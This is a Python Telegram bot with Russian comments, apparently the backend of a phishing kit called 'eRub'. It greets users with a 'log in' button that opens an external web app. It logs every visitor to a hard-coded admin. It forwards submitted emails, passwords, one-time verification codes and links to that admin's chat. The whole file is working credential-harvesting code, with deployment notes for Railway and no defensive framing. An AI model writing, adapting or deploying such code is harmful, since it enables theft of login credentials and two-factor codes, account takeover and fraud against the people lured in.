import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ==================== КОНФИГ ====================
# Ищем BOT_TOKEN (как у тебя в Railway). Если нет - ищем TELEGRAM_TOKEN.
BOT_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
ADMIN_ID_STR = os.environ.get("ADMIN_ID", "8542901240")
WEB_APP_URL = "https://alexandersvet2711-sys.github.io/erub/"
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Проверка, что токен нашелся
if not BOT_TOKEN:
    logger.error("❌ ОШИБКА: Переменная BOT_TOKEN не найдена в Railway!")
    exit(1)

try:
    ADMIN_ID = int(ADMIN_ID_STR)
except ValueError:
    logger.error(f"❌ ОШИБКА: ADMIN_ID должен быть числом, а не '{ADMIN_ID_STR}'")
    exit(1)

class ErubBot:
    def __init__(self):
        # Увеличенные таймауты для Railway
        custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
        
        self.app = Application.builder()\
            .token(BOT_TOKEN)\
            .request(custom_request)\
            .get_updates_request(HTTPXRequest(connect_timeout=30.0))\
            .build()
            
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    # ===== 1. /start =====
    async def start(self, update: Update, context):
        user = update.effective_user
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        # Уведомление ТЕБЕ в ЛС
        try:
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                     f"👤 ID: `{user.id}`\n"
                     f"👤 Имя: {user.first_name or 'без имени'}\n"
                     f"👤 Username: @{user.username or 'нет'}\n"
                     f"🕐 Время: {current_time}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления: {e}")

        # Приветствие пользователю
        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\n"
            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    # ===== 2. Обработка сообщений (на случай tg.sendData) =====
    async def handle(self, update: Update, context):
        if not update.message: return
        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        if chat_id == ADMIN_ID: return

        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')

                if email and password and not code and not link:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: `{user_id}`\n📧 Логин: `{email}`\n🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Данные приняты.")
                    return

                if code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📧 КОД!\n👤 ID: `{user_id}`\n🔢 Код: `{code}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Код отправлен.")
                    return

                if link:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔗 ССЫЛКА!\n👤 ID: `{user_id}`\n🔗 Ссылка: `{link}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Ссылка отправлена.")
                    return
            except Exception as e:
                logger.error(f"Ошибка JSON: {e}")
        else:
            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    def run(self):
        print("=" * 50)
        print("🚀 БОТ ЗАПУЩЕН")
        print(f"👤 ADMIN_ID: {ADMIN_ID}")
        print("=" * 50)
        self.app.run_polling(bootstrap_retries=5)

if __name__ == "__main__":
    ErubBot().run()
